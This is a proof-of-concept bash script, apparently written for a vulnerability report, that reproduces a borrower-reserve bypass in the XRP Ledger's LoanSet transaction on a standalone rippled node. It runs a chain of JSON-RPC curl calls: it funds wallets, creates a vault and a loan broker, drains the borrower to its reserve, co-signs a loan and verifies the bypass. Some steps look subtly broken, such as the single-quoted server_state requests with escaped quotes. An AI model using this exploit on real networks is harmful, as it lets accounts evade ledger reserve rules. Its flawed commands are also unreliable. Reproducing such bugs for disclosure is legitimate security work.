# LoanSet Borrower Reserve Bypass – Stand-alone Node PoC

The commands below reproduce the borrower-reserve bypass against a standalone `rippled`.  
Every step uses only JSON-RPC or built-in signing utilities (Option B).

```bash
###############################################################################
# 1. Start standalone rippled
###############################################################################
./rippled -a --start --conf rippled.cfg
# Leave the node running in a separate terminal.

###############################################################################
# 2. Create deterministic wallets
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"issuer reserve poc"}]
}' | tee issuer_wallet.json

curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"broker reserve poc"}]
}' | tee broker_wallet.json

curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"borrower reserve poc"}]
}' | tee borrower_wallet.json

ISSUER_ACCOUNT=$(jq -r '.result.account_id' issuer_wallet.json)
ISSUER_SECRET=$(jq -r '.result.master_seed' issuer_wallet.json)
BROKER_ACCOUNT=$(jq -r '.result.account_id' broker_wallet.json)
BROKER_SECRET=$(jq -r '.result.master_seed' broker_wallet.json)
BORROWER_ACCOUNT=$(jq -r '.result.account_id' borrower_wallet.json)
BORROWER_SECRET=$(jq -r '.result.master_seed' borrower_wallet.json)

###############################################################################
# 3. Fund issuer, broker, borrower from genesis
###############################################################################
for acct in "$ISSUER_ACCOUNT" "$BROKER_ACCOUNT" "$BORROWER_ACCOUNT"; do
  curl -s -X POST http://127.0.0.1:5005 -d "{
    \"method\":\"submit\",
    \"params\":[{
      \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",
      \"tx_json\":{
        \"TransactionType\":\"Payment\",
        \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",
        \"Destination\":\"$acct\",
        \"Amount\":\"100000000000\"
      }
    }]
  }" | jq '.result.engine_result'
done

###############################################################################
# 4. Establish IOU trustlines and issue liquidity
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"TrustSet\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"LimitAmount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"1000000000\"
      },
      \"Flags\":262144
    }
  }]
}" | jq '.result.engine_result'

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BORROWER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"TrustSet\",
      \"Account\":\"$BORROWER_ACCOUNT\",
      \"LimitAmount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"1000000000\"
      },
      \"Flags\":262144
    }
  }]
}" | jq '.result.engine_result'

# Issue IOUs to the broker so the pseudo-account can hold cover.
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$ISSUER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"Payment\",
      \"Account\":\"$ISSUER_ACCOUNT\",
      \"Destination\":\"$BROKER_ACCOUNT\",
      \"Amount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"1000000\"
      },
      \"Flags\":131072
    }
  }]
}" | jq '.result.engine_result'

###############################################################################
# 5. Create vault (scale 6) and record VaultID
###############################################################################
VAULT_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"VaultCreate\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"Asset\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\"
      },
      \"Scale\":6
    }
  }]
}" | jq -r '.result.tx_json.hash')

VAULT_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"tx\",
  \"params\":[{\"transaction\":\"$VAULT_HASH\"}]
}" | jq -r '.result.meta.AffectedNodes[]
    | select(.CreatedNode? and .CreatedNode.LedgerEntryType==\"Vault\")
    .CreatedNode.LedgerIndex')

###############################################################################
# 6. Create LoanBroker with small minimum cover and deposit cover
###############################################################################
BROKER_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"LoanBrokerSet\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"VaultID\":\"$VAULT_ID\",
      \"CoverRateMinimum\":1
    }
  }]
}" | jq -r '.result.tx_json.hash')

LOANBROKER_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"tx\",
  \"params\":[{\"transaction\":\"$BROKER_HASH\"}]
}" | jq -r '.result.meta.AffectedNodes[]
    | select(.CreatedNode? and .CreatedNode.LedgerEntryType==\"LoanBroker\")
    .CreatedNode.LedgerIndex')

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BROKER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"LoanBrokerCoverDeposit\",
      \"Account\":\"$BROKER_ACCOUNT\",
      \"LoanBrokerID\":\"$LOANBROKER_ID\",
      \"Amount\":{
        \"currency\":\"USD\",
        \"issuer\":\"$ISSUER_ACCOUNT\",
        \"value\":\"50000\"
      }
    }
  }]
}" | jq '.result.engine_result'

###############################################################################
# 7. Drain borrower down to its current reserve
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_info\",
  \"params\":[{
    \"account\":\"$BORROWER_ACCOUNT\",
    \"strict\":true
  }]
}" | tee borrower_info_before.json

OWNER_COUNT=$(jq -r '.result.account_data.OwnerCount' borrower_info_before.json)
MIN_RESERVE=$(curl -s -X POST http://127.0.0.1:5005 -d '{
  \"method\":\"server_state\",
  \"params\":[{}]
}' | jq -r '.result.state.validated_ledger.reserve_base' )
FEE_UNIT=$(curl -s -X POST http://127.0.0.1:5005 -d '{
  \"method\":\"server_state\",
  \"params\":[{}]
}' | jq -r '.result.state.validated_ledger.reserve_inc' )

TARGET_RESERVE=$(( MIN_RESERVE + OWNER_COUNT * FEE_UNIT ))
CURRENT_BAL=$(jq -r '.result.account_data.Balance' borrower_info_before.json)
TO_RETURN=$(( CURRENT_BAL - TARGET_RESERVE ))

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"secret\":\"$BORROWER_SECRET\",
    \"tx_json\":{
      \"TransactionType\":\"Payment\",
      \"Account\":\"$BORROWER_ACCOUNT\",
      \"Destination\":\"$ISSUER_ACCOUNT\",
      \"Amount\":\"$TO_RETURN\"
    }
  }]
}" | jq '.result.engine_result'

curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_info\",
  \"params\":[{
    \"account\":\"$BORROWER_ACCOUNT\",
    \"strict\":true
  }]
}" | tee borrower_info_drained.json

###############################################################################
# 8. Prepare LoanSet transaction JSON (without signatures)
###############################################################################
BROKER_SEQ=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_info\",
  \"params\":[{
    \"account\":\"$BROKER_ACCOUNT\",
    \"strict\":true
  }]
}" | jq -r '.result.account_data.Sequence')

cat > loan_template.json <<EOF
{
  "TransactionType": "LoanSet",
  "Account": "$BROKER_ACCOUNT",
  "LoanBrokerID": "$LOANBROKER_ID",
  "Counterparty": "$BORROWER_ACCOUNT",
  "PrincipalRequested": {
    "currency": "USD",
    "issuer": "$ISSUER_ACCOUNT",
    "value": "100"
  },
  "PaymentInterval": 2419200,
  "PaymentTotal": 12,
  "Fee": "12",
  "Sequence": $BROKER_SEQ,
  "SigningPubKey": ""
}
EOF

LOAN_TEMPLATE=$(jq -c '.' loan_template.json)

###############################################################################
# 9. Generate borrower CounterpartySignature (signature_target)
###############################################################################
# sign with signature_target = CounterpartySignature (borrower)
B_COUNTER=$(rippled --conf rippled.cfg sign "$BORROWER_SECRET" "$LOAN_TEMPLATE" offline CounterpartySignature |
  jq -r '.result.tx_json.CounterpartySignature')
echo "$B_COUNTER" | jq '.' > counterparty_signature.json

###############################################################################
# 10. Embed CounterpartySignature and sign transaction with broker
###############################################################################
cat loan_template.json | jq ".CounterpartySignature = $(cat counterparty_signature.json)" > loan_with_counter.json
LOAN_WITH_COUNTER=$(jq -c '.' loan_with_counter.json)

# sign final tx with broker (offline)
SIGNED_LOAN=$(rippled --conf rippled.cfg sign "$BROKER_SECRET" "$LOAN_WITH_COUNTER" offline |
  jq -r '.result.tx_blob')

###############################################################################
# 11. Submit the signed LoanSet
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"submit\",
  \"params\":[{
    \"tx_blob\":\"$SIGNED_LOAN\"
  }]
}" | jq '.result.engine_result'

###############################################################################
# 12. Verify borrower reserve was bypassed
###############################################################################
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_info\",
  \"params\":[{
    \"account\":\"$BORROWER_ACCOUNT\",
    \"strict\":true
  }]
}" | tee borrower_info_after.json

cat borrower_info_after.json | jq '.result.account_data | {Balance,OwnerCount}'

# Compute reserve requirement after LoanSet
OWNER_COUNT_AFTER=$(jq -r '.result.account_data.OwnerCount' borrower_info_after.json)
BALANCE_AFTER=$(jq -r '.result.account_data.Balance' borrower_info_after.json)
REQUIRED_AFTER=$(( MIN_RESERVE + OWNER_COUNT_AFTER * FEE_UNIT ))
echo "Borrower balance after: $BALANCE_AFTER"
echo "Reserve required after: $REQUIRED_AFTER"

# Check that the borrower now owns a loan SLE
curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"ledger_entry\",
  \"params\":[{
    \"loan\":{
      \"Account\":\"$BORROWER_ACCOUNT\",
      \"Broker\": \"$LOANBROKER_ID\",
      \"LoanSequence\":1
    }
  }]
}" | jq '.result'
```

**Expected outcome**

- `submit` returns `tesSUCCESS`.
- `OwnerCount` increases by 1 while `Balance` remains below `accountReserve(OwnerCount)`.
- A loan ledger entry exists for the borrower, proving the reserve bypass.
